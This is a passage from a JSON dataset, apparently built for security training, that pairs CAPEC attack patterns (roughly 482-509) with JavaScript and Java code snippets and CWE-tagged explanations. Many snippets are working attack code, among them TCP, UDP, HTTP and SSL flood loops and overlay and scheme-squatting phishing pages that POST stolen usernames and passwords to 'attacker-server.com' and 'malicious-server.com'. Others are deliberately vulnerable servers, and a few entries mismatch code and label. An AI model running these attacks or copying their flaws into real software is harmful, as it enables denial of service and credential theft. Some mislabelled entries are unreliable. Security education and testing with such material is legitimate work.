        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 80;\nconst maxConnections = 1000;\nlet connections = 0;\n\nfunction flood() {\n  if (connections < maxConnections) {\n    const client = new net.Socket();\n    client.connect(targetPort, targetHost, () => {\n      console.log('Connected');\n      connections++;\n      client.write('GET / HTTP/1.1\\r\\nHost: ' + targetHost + '\\r\\n\\r\\n');\n    });\n    client.on('error', (err) => {\n      console.error('Connection error:', err.message);\n    });\n    client.on('close', () => {\n      connections--;\n      flood();\n    });\n  }\n}\n\nfor (let i = 0; i < maxConnections; i++) {\n  flood();\n}",
        "description": "This JavaScript code snippet demonstrates a basic TCP flood attack using the 'net' module to create multiple TCP connections to a target server. The code attempts to establish a large number of connections (up to 1000) to the target host and port, simulating a denial-of-service attack. This embodies the main idea of CAPEC-482 (TCP Flood) by exploiting the server's need to maintain state information for each connection. The code also touches on CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of connections, potentially overwhelming the server. Additionally, it highlights CWE-406 (Insufficient Control of Network Message Volume) by not monitoring or controlling the volume of network traffic generated."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML without validation\n    res.send('XML processed');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable server-side implementation using Express.js that processes XML data sent by clients. The server accepts XML data via a POST request to the '/upload' endpoint and uses the 'xml2js' library to parse the XML. However, the code does not validate the XML against a schema (CWE-112), making it susceptible to various XML-based attacks such as XML Injection (CWE-91) and Improper Restriction of XML External Entity Reference (CWE-611). This lack of validation and improper handling of XML data embodies the main idea of the deprecated CAPEC related to XML Client-Side Attacks."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak random number generator\nfunction weakRandom() {\n  return Math.floor(Math.random() * 1000000);\n}\n\n// Simulate key generation using weak random values\nfunction generateWeakKey() {\n  const key = weakRandom().toString(16);\n  return key.padStart(64, '0'); // Simulate a 256-bit key\n}\n\n// Simulate signing a message\nfunction signMessage(message, key) {\n  const sign = crypto.createHmac('sha256', key).update(message).digest('hex');\n  return sign;\n}\n\n// Attacker recreates the key using the same weak random generator\nconst attackerKey = generateWeakKey();\nconst message = 'Important transaction';\nconst forgedSignature = signMessage(message, attackerKey);\n\nconsole.log(`Forged Signature: ${forgedSignature}`);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can recreate a private signature key due to the use of a weak random number generator (CWE-330, CWE-1241). The `weakRandom` function generates predictable random values, which are then used to create a cryptographic key in `generateWeakKey`. The `signMessage` function simulates the signing of a message using this weak key. An attacker can exploit this weakness by generating the same key and forging a signature, misleading a victim into believing the message is from a reputable source. This embodies the main idea of CAPEC- Signature Spoofing by Key Recreation."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst target = '192.168.1.1'; // Target IP\nconst port = 12345; // Target port\nconst message = Buffer.from('Flood attack');\n\nfunction flood() {\n  for (let i = 0; i < 10000; i++) { // CWE-770: No limit on resource allocation\n    client.send(message, 0, message.length, port, target, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n}\n\nflood();\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});\n\nclient.on('error', (err) => {\n  console.error(`Client error:\n${err.stack}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP flood attack, which is a type of denial-of-service (DoS) attack. The code uses the 'dgram' module to create a UDP client that sends a large number of UDP packets to a target IP address and port. The flood function sends 10,000 UDP packets to the target, which can overwhelm the target's network bandwidth and resources, leading to a denial of service. This snippet embodies the main idea of CAPEC-UDP Flood and highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of packets sent. Additionally, it touches on CWE-406 (Insufficient Control of Network Message Volume) by not monitoring or controlling the volume of transmitted network traffic."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // No throttling or resource limits\n  // No validation of the source address\n});\n\nserver.on('error', (err) => {\n  console.log(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. The server listens for incoming messages and logs them to the console. The code embodies the main idea of an ICMP Flood attack by not implementing any throttling or resource limits (CWE-770), and not validating the source address of incoming messages (CWE-923). This makes the server vulnerable to a flooding attack, where an adversary can send a high rate of packets to consume network bandwidth and deny legitimate users access to the service. Additionally, the lack of source address validation makes it difficult to trace the source of the attack."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource?query=sensitiveData',\n  method: 'GET'\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) { // CWE-770: No limit on resource allocation\n    const req = http.request(options, res => {\n      res.on('data', d => {});\n    });\n    req.on('error', error => {\n      console.error(error);\n    });\n    req.end();\n  }\n}\n\nfloodServer();",
        "description": "This JavaScript code snippet demonstrates an HTTP Flood attack, which is designed to overwhelm a target server by sending a large number of HTTP GET requests. The code uses the 'http' module to create and send 1000 GET requests to 'target-server.com'. The requests include a sensitive query string in the URL (CWE-598), and there is no limit on the number of requests being sent (CWE-770). This can exhaust the server's resources, leading to a denial of service for legitimate users. The code represents the main idea of CAPEC-488 (HTTP Flood) by showing how an attacker can consume server resources using legitimate HTTP requests."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "const https = require('https');\nconst options = {\n  hostname: 'target-server.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) {\n    const req = https.request(options, (res) => {\n      res.on('data', (d) => {});\n    });\n    req.on('error', (e) => {});\n    req.end();\n  }\n}\n\nsetInterval(floodServer, 100);",
        "description": "This JavaScript code snippet demonstrates a basic SSL flood attack. It repeatedly sends a large number of HTTPS requests to a target server, aiming to exhaust the server's resources. The 'floodServer' function creates 1000 HTTPS requests in a loop, and this function is called every 100 milliseconds using 'setInterval'. This simulates the 'SSL Flood' attack described in the CAPEC by consuming a disproportionate amount of server resources. The related CWEs are represented by the lack of throttling (CWE-770), insufficient resource pool (CWE-410), and uncontrolled resource consumption (CWE-400), which together allow the attack to potentially deny service to legitimate users."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "const http = require('http');\n\nfunction sendAmplifiedRequest(targetServer) {\n  const options = {\n    hostname: 'third-party-service.com',\n    port: 80,\n    path: '/api/large-response',\n    method: 'GET',\n    headers: {\n      'X-Forwarded-For': targetServer\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Do nothing with the response\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Example usage\nsendAmplifiedRequest('victim-server.com');",
        "description": "This JavaScript code snippet demonstrates an amplification attack by sending a request to a third-party service, spoofing the source address to be that of the target server (victim-server.com). The third-party service is expected to generate a large response, which is then sent to the target server, causing it to handle a large amount of traffic. The code leverages the CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the size of the response, CWE-405 (Asymmetric Resource Consumption) by causing the target server to handle more traffic than the initial request, and CWE-406 (Insufficient Control of Network Message Volume) by not controlling the volume of traffic sent to the target server. The 'X-Forwarded-For' header is used to spoof the source address, aligning with CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "function expandMacro(input) {\n  const macros = {\n    'A': 'AAAAAAAAAA', // 10 A's\n    'B': 'BBBBBBBBBB'  // 10 B's\n  };\n  let expanded = input;\n  for (let i = 0; i < 1000; i++) { // excessive iterations\n    expanded = expanded.replace(/A|B/g, match => macros[match]);\n  }\n  return expanded;\n}\n\n// Example usage\nconst input = 'A'.repeat(1000); // Large input\nconsole.log(expandMacro(input));",
        "description": "This JavaScript code snippet demonstrates a quadratic data expansion vulnerability. The `expandMacro` function takes an input string and repeatedly replaces occurrences of 'A' and 'B' with their respective macro values, which are strings of 10 characters each. The loop runs 1000 times, causing excessive memory allocation and potential denial of service. This embodies the CAPEC description by showing how repeated macro-like substitutions can lead to excessive memory usage. The related CWEs are represented by the lack of limits on resource allocation (CWE-770), improper handling of sequential memory allocation (CWE-1325), and the use of large data elements (CWE-1043)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "function vulnerableRegex(input) {\n  const regex = /(a+)+$/;\n  return regex.test(input);\n}\n\n// Example usage\nconst input = 'a'.repeat(30) + 'b';\nconsole.log(vulnerableRegex(input));",
        "description": "This JavaScript code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The function `vulnerableRegex` takes an input string and tests it against a regular expression `/(a+)+$/`. This regex is vulnerable because it uses nested quantifiers `(a+)+`, which can lead to exponential backtracking. When the input string is crafted to exploit this, such as a long sequence of 'a' characters followed by a 'b', the regex engine will consume excessive CPU cycles trying to match the pattern, leading to potential denial of service. This example embodies the main idea of CAPEC-400 and related CWEs, particularly CWE-1333 (Inefficient Regular Expression Complexity) and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // Simulate processing of a large SOAP array\n      if (result && result.Envelope && result.Envelope.Body && result.Envelope.Body[0].Array) {\n        const array = result.Envelope.Body[0].Array[0];\n        if (array.length > 1000000) { // CWE-770: No limit on array size\n          res.writeHead(500, {'Content-Type': 'text/plain'});\n          res.end('Array size too large');\n          return;\n        }\n        // Process array elements (omitted for brevity)\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Request processed');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and processes SOAP messages. The server reads the request body and attempts to parse it as XML. If the XML contains a SOAP array, the code checks the array's length. If the array length exceeds 1,000,000 elements, the server responds with an error, simulating a memory exhaustion attack (CAPEC-272). This example highlights CWE-770 by not imposing a strict limit on the array size, potentially leading to resource exhaustion. The code also touches on CWE-1325 by not properly controlling the memory allocation for the array elements."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'target.server.com', () => {\n  console.log('Connected');\n  // Fragmented TCP packet\n  const fragment1 = Buffer.from('4500', 'hex'); // IP header\n  const fragment2 = Buffer.from('0014', 'hex'); // TCP header with flags\n  client.write(fragment1);\n  setTimeout(() => client.write(fragment2), 100); // Send second fragment after a delay\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP fragmentation attack using the 'net' module. The code connects to a target server and sends a fragmented TCP packet. The first fragment contains the IP header, and the second fragment, sent after a delay, contains the TCP header with flags. This fragmentation can bypass certain network filters that do not reassemble packets before filtering. The code also highlights CWE-770 by not limiting the number of fragments sent, CWE-404 by not properly handling resource shutdown, and CWE-319 by transmitting data in cleartext."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst target = '192.168.1.1';\nconst port = 12345;\nconst largeMessage = Buffer.alloc(2000, 'A'); // 2000 bytes, larger than typical MTU\n\nfunction sendFragmentedPackets() {\n  for (let i = 0; i < 1000; i++) { // Send 1000 large packets\n    client.send(largeMessage, port, target, (err) => {\n      if (err) console.error('Error sending packet:', err);\n    });\n  }\n}\n\nsendFragmentedPackets();\nclient.close();",
        "description": "This JavaScript code snippet demonstrates a UDP Fragmentation attack. It uses the 'dgram' module to create a UDP client that sends large UDP packets (2000 bytes) to a target server. The size of these packets exceeds the typical MTU (1500 bytes), causing fragmentation. The loop sends 1000 such packets, aiming to consume the target's bandwidth and CPU resources. This code embodies the CAPEC description by illustrating how an attacker can exploit resource allocation without limits (CWE-770) and insufficient control of network message volume (CWE-406)."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst fragmentICMP = (target, port) => {\n  const message = Buffer.alloc(65507, 'A'); // Large message to simulate fragmentation\n  for (let i = 0; i < 1000; i++) { // Send multiple fragmented packets\n    client.send(message, 0, message.length, port, target, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n};\n\nfragmentICMP('192.168.1.1', 33434); // Target IP and port",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends a large number of oversized packets to a target IP address. The 'fragmentICMP' function simulates an ICMP fragmentation attack by sending multiple large packets to the target, which can overwhelm the target's resources, leading to potential crashes or non-responsiveness. This embodies the main idea of the CAPEC by demonstrating how an attacker might exploit resource allocation without limits (CWE-770) and improper resource shutdown or release (CWE-404). The code does not handle resource limits or proper shutdown, making it vulnerable to such attacks."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction findSensitiveFiles(directory) {\n  const sensitiveFiles = ['config.json', 'secrets.txt', 'access_control_list.txt'];\n  fs.readdir(directory, (err, files) => {\n    if (err) {\n      console.error('Error reading directory:', err);\n      return;\n    }\n    files.forEach(file => {\n      if (sensitiveFiles.includes(file)) {\n        const filePath = path.join(directory, file);\n        fs.readFile(filePath, 'utf8', (err, data) => {\n          if (err) {\n            console.error('Error reading file:', err);\n            return;\n          }\n          console.log(`Found sensitive file: ${filePath}`);\n          console.log('File contents:', data);\n        });\n      }\n    });\n  });\n}\n\n// Example usage\nfindSensitiveFiles('/path/to/directory');",
        "description": "This JavaScript code snippet demonstrates a file discovery process where an adversary searches for common sensitive files within a specified directory. The function `findSensitiveFiles` takes a directory path as input and checks for the presence of files like 'config.json', 'secrets.txt', and 'access_control_list.txt'. If such files are found, their contents are read and logged to the console. This embodies the CAPEC 'File Discovery' by probing for key files that may contain sensitive information. The code also touches on related CWEs: it exposes sensitive information (CWE-200), potentially exposes access control list files (CWE-529), and relies on file names to identify sensitive files (CWE-646)."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "document.addEventListener('visibilitychange', function() {\n  if (document.hidden) {\n    // Simulate sensitive information being exposed in a screenshot\n    document.getElementById('sensitive-info').style.display = 'none';\n  } else {\n    document.getElementById('sensitive-info').style.display = 'block';\n  }\n});\n\n// Example of cleartext transmission of sensitive information\nfetch('http://example.com/api', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    sensitiveData: 'user_password'\n  })\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information might be exposed through iOS screenshots when an application is sent to the background. The 'visibilitychange' event listener hides sensitive information when the document becomes hidden (e.g., when the app is backgrounded), but this approach is flawed as it may not be sufficient to prevent exposure. Additionally, the code includes an example of cleartext transmission of sensitive information, which can be intercepted by unauthorized actors. This snippet embodies the CAPEC's main idea of probing iOS screenshots for sensitive information and highlights related weaknesses such as exposure of private information (CWE-359), cleartext transmission (CWE-319), and improper handling of sensitive data."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "const sendSensitiveData = (data) => {\n  const intent = new Intent('com.example.SEND_DATA');\n  intent.putExtra('data', data);\n  // Implicit intent without permission check\n  sendBroadcast(intent);\n};\n\nconst receiveSensitiveData = (context) => {\n  const receiver = new BroadcastReceiver({\n    onReceive: (context, intent) => {\n      const data = intent.getStringExtra('data');\n      console.log('Received data:', data);\n    }\n  });\n  const filter = new IntentFilter('com.example.SEND_DATA');\n  // Registering receiver without verifying the source\n  context.registerReceiver(receiver, filter);\n};",
        "description": "This JavaScript code snippet demonstrates a vulnerable Android application scenario where sensitive data is transmitted using an implicit intent without proper permission checks. The `sendSensitiveData` function creates an implicit intent to send data, but it does not restrict which applications can receive this intent. The `receiveSensitiveData` function registers a broadcast receiver to listen for the intent, but it does not verify the source of the intent. This setup allows any malicious application to intercept, modify, or block the intent, leading to potential information disclosure, data injection, or denial of service. The code embodies the main idea of CAPEC-273 (Android Intent Intercept) and highlights related weaknesses such as CWE-925 (Improper Verification of Intent by Broadcast Receiver) and CWE-927 (Use of Implicit Intent for Sensitive Communication)."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "const webView = document.getElementById('webView');\n\n// Exposed dangerous method\nwebView.addEventListener('load', function() {\n  webView.executeScript(`\n    // Injected malicious code\n    document.cookie = 'sessionId=maliciousSessionId';\n    document.body.innerHTML += '<script src=\"http://malicious.com/malware.js\"></script>';\n  `);\n});\n\n// Improper verification of source\nif (document.referrer !== 'https://trusted.com') {\n  console.warn('Untrusted source!');\n} else {\n  // Client-side enforcement of server-side security\n  webView.src = 'https://trusted.com';\n}",
        "description": "This JavaScript code snippet demonstrates a WebView Injection attack. The code listens for the 'load' event on a WebView component and then executes a script that injects malicious code into the web page. This injected code manipulates cookies and adds a script tag to load additional malicious content. The code also shows improper verification of the source by only logging a warning if the referrer is not trusted, rather than blocking the request. Additionally, it relies on client-side enforcement of server-side security by setting the WebView source to a trusted URL without proper validation."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that does not verify the source of the request\napp.post('/sensitive-data', (req, res) => {\n  const sensitiveData = req.body.data;\n  // Implicitly trust the incoming request and process sensitive data\n  processSensitiveData(sensitiveData);\n  res.send('Data processed');\n});\n\n// Function to mimic processing of sensitive data\nfunction processSensitiveData(data) {\n  console.log('Processing sensitive data:', data);\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable server endpoint using Express.js. The endpoint '/sensitive-data' accepts POST requests and processes sensitive data without verifying the source of the request. This embodies the main idea of the CAPEC 'Android Activity Hijack' by demonstrating how an adversary could intercept and manipulate communication channels to exploit sensitive operations. The code also reflects related CWEs, such as improper verification of the source (CWE-940) and improper restriction of communication channels (CWE-923). The lack of verification allows any actor to send data to this endpoint, potentially leading to unauthorized access and data breaches."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that accepts data from any source\napp.post('/updateData', (req, res) => {\n  const data = req.body.data;\n  // Improper access control: No verification of the source of the request\n  if (data) {\n    // Process the data without validation\n    console.log('Data received:', data);\n    res.send('Data updated successfully');\n  } else {\n    res.status(400).send('Invalid data');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js server endpoint that embodies the main idea of the CAPEC 'Intent Spoof'. The '/updateData' endpoint accepts POST requests and processes the data without verifying the source of the request, which is an example of 'Improper Access Control' (CWE-284). This lack of verification allows any malicious actor to send data to this endpoint, potentially leading to data modification or injection attacks. The code also demonstrates 'Improper Export of Application Components' (CWE-926) by exposing the endpoint to any external source without proper restrictions."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        webView.loadUrl(\"file:///android_asset/sample.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to load a local HTML file and exposes a JavaScript interface named 'AndroidInterface'. The interface provides a method 'showToast' that can be called from JavaScript. This setup can be exploited by a malicious web page loaded in the WebView to access the 'showToast' method, leading to potential security risks such as improper access control (CWE-284) and exposed dangerous methods (CWE-749). The code represents the main idea of the CAPEC by showing how an interface registered through WebView's addJavascriptInterface becomes globally accessible, potentially allowing unauthorized access to application-specific functionality."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create an iframe to impersonate a legitimate task\n  var iframe = document.createElement('iframe');\n  iframe.style.position = 'absolute';\n  iframe.style.top = '0';\n  iframe.style.left = '0';\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  iframe.style.zIndex = '1000';\n  iframe.src = 'https://legitimate-site.com/login'; // URL of the legitimate task\n  document.body.appendChild(iframe);\n\n  // Capture user input from the impersonated task\n  iframe.onload = function() {\n    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n    iframeDoc.addEventListener('submit', function(event) {\n      event.preventDefault();\n      var username = iframeDoc.querySelector('input[name=\"username\"]').value;\n      var password = iframeDoc.querySelector('input[name=\"password\"]').value;\n      console.log('Captured credentials:', username, password);\n      // Send captured credentials to the attacker's server\n      fetch('https://attacker-server.com/steal', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ username: username, password: password })\n      });\n    });\n  };\n});",
        "description": "This JavaScript code snippet demonstrates a task impersonation attack. It creates an iframe that overlays the entire webpage, impersonating a legitimate login task from 'https://legitimate-site.com/login'. When the user interacts with this iframe, their credentials are captured and sent to an attacker's server. This example leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by overlaying a malicious iframe, CWE-506 (Embedded Malicious Code) by embedding code that captures and exfiltrates user credentials, and CWE-285 (Improper Authorization) by not properly authorizing the actions within the iframe."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "window.addEventListener('load', function() {\n  if (!window.location.href.includes('targetApp')) {\n    window.location.href = 'maliciousApp://login?redirect=' + encodeURIComponent(window.location.href);\n  }\n});\n\n// Malicious App URL Scheme Handler\nfunction handleCustomURLScheme(url) {\n  var params = new URLSearchParams(url.split('?')[1]);\n  var redirectUrl = params.get('redirect');\n  if (redirectUrl) {\n    // Mimic the target application login screen\n    document.body.innerHTML = '<h1>Login to Target App</h1><form id=\"loginForm\"><input type=\"text\" id=\"username\" placeholder=\"Username\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>';\n    document.getElementById('loginForm').addEventListener('submit', function(event) {\n      event.preventDefault();\n      var username = document.getElementById('username').value;\n      var password = document.getElementById('password').value;\n      // Send credentials to malicious server\n      fetch('https://malicious-server.com/steal-credentials', {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json'\n        },\n        body: JSON.stringify({ username: username, password: password })\n      }).then(function() {\n        // Redirect to the original URL\n        window.location.href = redirectUrl;\n      });\n    });\n  }\n}\n\n// Simulate the URL scheme being invoked\nhandleCustomURLScheme(window.location.href);",
        "description": "This JavaScript code snippet demonstrates a Scheme Squatting attack. When the page loads, it checks if the URL contains 'targetApp'. If not, it redirects to a custom URL scheme 'maliciousApp://login' with the current URL as a query parameter. The 'handleCustomURLScheme' function mimics the target application's login screen and captures the user's credentials, sending them to a malicious server. After stealing the credentials, it redirects the user back to the original URL. This code embodies the CAPEC by registering a URL scheme for a target application and mimicking its interface to steal sensitive information. It also incorporates CWE-939 (Improper Authorization in Handler for Custom URL Scheme) and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a transparent overlay\n  var overlay = document.createElement('div');\n  overlay.style.position = 'absolute';\n  overlay.style.top = '0';\n  overlay.style.left = '0';\n  overlay.style.width = '100%';\n  overlay.style.height = '100%';\n  overlay.style.opacity = '0';\n  overlay.style.zIndex = '1000';\n  document.body.appendChild(overlay);\n\n  // Create a hidden button that will be clicked\n  var hiddenButton = document.createElement('button');\n  hiddenButton.style.position = 'absolute';\n  hiddenButton.style.top = '50%';\n  hiddenButton.style.left = '50%';\n  hiddenButton.style.transform = 'translate(-50%, -50%)';\n  hiddenButton.style.zIndex = '1001';\n  hiddenButton.style.opacity = '0';\n  hiddenButton.onclick = function() {\n    alert('Hidden button clicked!');\n  };\n  document.body.appendChild(hiddenButton);\n\n  // Simulate user tap on the overlay\n  overlay.addEventListener('click', function() {\n    hiddenButton.click();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a tapjacking attack. When the DOM content is loaded, it creates a transparent overlay that covers the entire screen. Additionally, it places a hidden button in the center of the screen. When the user clicks anywhere on the overlay, the click event is passed through to the hidden button, triggering its click event. This simulates the user being misled into clicking on an element they cannot see, which is a core concept of tapjacking. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the overlay to intercept user interactions, and CWE-451 (User Interface (UI) Misrepresentation of Critical Information) by hiding the true nature of the button being clicked."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "const fs = require('fs');\n\n// Insecure storage of sensitive information\nconst sensitiveData = 'user_password=12345';\n\n// Store sensitive data in a file without proper access control\nfs.writeFileSync('/tmp/sensitive_data.txt', sensitiveData);\n\nconsole.log('Sensitive data stored without proper access control.');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Physical Theft' by embodying several related CWEs. The code stores sensitive information (a user password) in a file located in a temporary directory. This file is created without any access control mechanisms, making it vulnerable to unauthorized access if an adversary gains physical access to the system. The snippet highlights CWE-922 (Insecure Storage of Sensitive Information) and CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control). The lack of proper access control and secure storage mechanisms makes it easy for an attacker with physical access to retrieve the sensitive information, aligning with the main idea of the CAPEC."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "document.getElementById('loginButton').addEventListener('click', function() {\n  var username = document.getElementById('username').value;\n  var password = document.getElementById('password').value;\n  console.log('Username: ' + username + ', Password: ' + password); // CWE-200, CWE-359\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/login', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('username=' + username + '&password=' + password); // CWE-319\n});",
        "description": "This JavaScript code snippet demonstrates a login functionality that is vulnerable to shoulder surfing and several related CWEs. When the login button is clicked, it retrieves the username and password from input fields and logs them to the console (CWE-200, CWE-359), exposing sensitive information to anyone who can see the screen. Additionally, it sends the credentials in cleartext over an HTTP connection (CWE-319), which can be intercepted by unauthorized actors. This code embodies the main idea of the CAPEC by showing how sensitive information can be exposed through poor security practices."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate obtaining a service ticket encrypted with RC4\nfunction getServiceTicket() {\n  const ticket = 'fake_service_ticket'; // Placeholder for actual service ticket\n  const key = 'weakpassword'; // Weak password (CWE-521)\n  const cipher = crypto.createCipher('rc4', key);\n  let encrypted = cipher.update(ticket, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Save the ticket to disk (CWE-522)\nfunction saveTicketToDisk(ticket) {\n  fs.writeFileSync('ticket.txt', ticket);\n}\n\n// Simulate brute-forcing the ticket (CWE-308, CWE-309)\nfunction bruteForceTicket() {\n  const encryptedTicket = fs.readFileSync('ticket.txt', 'utf8');\n  const possibleKeys = ['weakpassword', '123456', 'password']; // Weak passwords\n  for (const key of possibleKeys) {\n    const decipher = crypto.createDecipher('rc4', key);\n    let decrypted;\n    try {\n      decrypted = decipher.update(encryptedTicket, 'hex', 'utf8');\n      decrypted += decipher.final('utf8');\n      if (decrypted === 'fake_service_ticket') {\n        console.log('Key found:', key);\n        return key;\n      }\n    } catch (err) {\n      // Ignore decryption errors\n    }\n  }\n  console.log('Key not found');\n  return null;\n}\n\nconst ticket = getServiceTicket();\nsaveTicketToDisk(ticket);\nbruteForceTicket();",
